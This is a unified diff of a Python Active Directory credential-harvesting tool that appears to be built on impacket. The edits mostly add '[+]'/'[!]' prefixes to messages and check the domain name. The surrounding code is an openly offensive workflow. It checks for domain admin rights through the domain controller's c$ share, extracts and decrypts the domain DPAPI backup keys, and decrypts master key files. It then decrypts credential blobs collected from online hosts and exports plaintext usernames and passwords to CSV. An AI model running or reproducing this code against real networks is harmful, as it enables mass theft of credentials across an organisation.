@@ -78,11 +78,23 @@ def main():
 	options                             = parser.parse_args()
 	domain, username, password, address = parse_target(options.target)
 	passLdap 							= password
+	
+
 	if domain is None:
-		domain = ''
+		print("[!] Domain can't be null")
+		sys.exit(1)
+	if len(domain)<1:
+		print("[!] Domain can't be null")
+		sys.exit(1)
+	if (domain.find('.') != -1):
+		print("[+] Targeting domain "+str(domain))
+	else:
+		domain = domain + ".local"
+		print("[+] Targeting domain "+str(domain))
+
 	if password == '' and username != '' and options.hashes is None :
 		from getpass import getpass
-		password = getpass("Password:")
+		password = getpass("[+] Password:")
 		passLdap = password
 	if options.hashes is not None:
 		lmhash, nthash = options.hashes.split(':')
@@ -115,15 +127,15 @@ def main():
 	# test if account is domain admin by accessing to DC c$ share
 	try:
 		if options.debug is True or options.debugmax is True:
-			print("Testing admin rights...")
+			print("[+] Testing admin rights...")
 		smbClient = SMBConnection(address, address, myName=myName, sess_port=port, preferredDialect=preferredDialect)
 		smbClient.login(username, password, domain, lmhash, nthash)
 		if smbClient.connectTree("c$") != 1:
 			raise
 		if options.debug is True or options.debugmax is True:
-			print("Admin access granted.")
+			print("[+] Admin access granted.")
 	except:
-		print("Error : Account disabled or access denied. Are you really a domain admin ?")
+		print("[!] Error : Account disabled or access denied. Are you really a domain admin ?")
 		if options.debug is True or options.debugmax is True:
 			import traceback
 			traceback.print_exc()
@@ -150,7 +162,7 @@ def main():
 	if debug is True or debugmax is True:
 		print("[+] It seems that " + str(len(online_computers)) + " computers are online ...")
 
-	if len(online_computers) <1:
+	if str(len(online_computers)) == "0":
 		print("\n[!] No computers available")
 		sys.exit()
 	# # Retrieving blobs and mkf files
@@ -161,7 +173,7 @@ def main():
 
 	if options.pvk is None:
 		if debug is True:
-			print("Domain backup keys not given.\nTrying to extract...")
+			print("[+] Domain backup keys not given.\n[+] Trying to extract...")
 		# get domain backup keys
 		try:
 			array_of_mkf_keys = []
@@ -195,7 +207,7 @@ def main():
 			key                     = header.getData() + pvk
 			open(directory + "/pvkfile.pvk", 'wb').write(key)
 		except:
-			print("Error : Can't extract domain backup keys.")
+			print("[!] Error : Can't extract domain backup keys.")
 			if options.debug is True or options.debugmax is True:
 				import traceback
 				traceback.print_exc()
@@ -210,8 +222,8 @@ def main():
 
 		# decrypt pvk file
 		if options.debug is True:
-			print("Domain backup keys found.")
-			print("Trying to decrypt PVK file...")
+			print("[+] Domain backup keys found.")
+			print("[+] Trying to decrypt PVK file...")
 		try:
 			pvkfile = open(pvk_file, 'rb').read()
 			key = PRIVATE_KEY_BLOB(pvkfile[len(PVK_FILE_HDR()):])
@@ -220,7 +232,7 @@ def main():
 
 			array_of_mkf_keys = []
 			if options.debug is True:
-				print("PVK file decrypted.\nTrying to decrypt all MFK...")
+				print("[+] PVK file decrypted.\n[+] Trying to decrypt all MFK...")
 
 			for filename in os.listdir(mkfFolder):
 				try:
@@ -248,23 +260,23 @@ def main():
 						key = domain_master_key['buffer'][:domain_master_key['cbMasterKey']]
 						array_of_mkf_keys.append(key)
 						if options.debugmax is True:
-							print("New mkf key decrypted : " + str(hexlify(key).decode('latin-1')) )
+							print("[+] New mkf key decrypted : " + str(hexlify(key).decode('latin-1')) )
 				except:
 					if options.debugmax is True:
-						print("Error occured while decrypting MKF.")
+						print("[!] Error occured while decrypting MKF.")
 						import traceback
 						traceback.print_exc()
 					pass
 			if options.debug is True:
-				print(str( len(array_of_mkf_keys)) + " MKF keys have been decrypted !")
+				print("[+] "+str( len(array_of_mkf_keys)) + " MKF keys have been decrypted !")
 		except:
-			print("Error occured while decrypting PVK file.")
+			print("[!] Error occured while decrypting PVK file.")
 			if options.debug is True:
 				import traceback
 				traceback.print_exc()
 			os._exit(1)
 	else:
-		print("Domain backup keys not found.")
+		print("[!] Domain backup keys not found.")
 		if options.debug is True:
 			import traceback
 			traceback.print_exc()
@@ -275,7 +287,7 @@ def main():
 	if len(array_of_mkf_keys) > 0:
 		# We have MKF keys so we can start blob decryption
 		if options.debug is True:
-			print("Starting blob decryption with MKF keys...")
+			print("[+] Starting blob decryption with MKF keys...")
 		array_of_credentials = []
 		for current_computer in os.listdir(blobFolder):
 			current_computer_folder = blobFolder + "/" + current_computer
@@ -291,7 +303,7 @@ def main():
 								blob = DPAPI_BLOB(cred['Data'])
 
 								if options.debugmax is True:
-									print("Starting decryption of blob " + filename + "...")
+									print("[+] Starting decryption of blob " + filename + "...")
 
 								for mkf_key in array_of_mkf_keys:
 									try:
@@ -313,13 +325,13 @@ def main():
 											array_of_credentials.append(tmp_cred)
 									except:
 										if options.debugmax is True:
-											print("Error occured while decrypting blob file.")
+											print("[!] Error occured while decrypting blob file.")
 											import traceback
 											traceback.print_exc()
 										pass
 							except:
 								if options.debug is True:
-									print("Error occured while decrypting blob file.")
+									print("[!] Error occured while decrypting blob file.")
 									import traceback
 									traceback.print_exc()
 								pass
@@ -327,8 +339,8 @@ def main():
 			if options.debug is True:
 				end = time.time()
 				elapsed = round(end - start)
-				print("Credentials gathered and decrypted in " + str(elapsed) + " seconds\n")
-				print(str(len(array_of_credentials)) + " credentials have been decrypted !\n")
+				print("[+] Credentials gathered and decrypted in " + str(elapsed) + " seconds\n")
+				print("[+] "+str(len(array_of_credentials)) + " credentials have been decrypted !\n")
 			i = 0
 			if options.csv is True:
 				with open(directory + '/exported_credentials.csv', 'w', encoding='UTF8') as f:
@@ -338,7 +350,7 @@ def main():
 						i = i + 1
 						current_row = str(credential['foundon']) +";"+ str(credential['inusersession'])+";"+  str(credential['lastwritten'])+";"+ str(credential['target'])+";"+ str(credential['username'])+";"+  str(credential['password1'])+";"+ str(credential['password2'])+"\n"
 						f.write(current_row)
-				print("File successfully saved to ./" + str(directory) + '/exported_credentials.csv')
+				print("[+] File successfully saved to ./" + str(directory) + '/exported_credentials.csv')
 			else:	
 				for credential in array_of_credentials:
 					if i == 0:
@@ -358,10 +370,10 @@ def main():
 				
 				
 		else:
-			print("No credentials could be decrypted.")
+			print("[!] No credentials could be decrypted.")
 			os._exit(1)
 	else:
-		print("No MKF have been decrypted.\nBlobs will not be decrypted.")
+		print("[!] No MKF have been decrypted.\nBlobs will not be decrypted.")
 		os._exit(1)
 
 
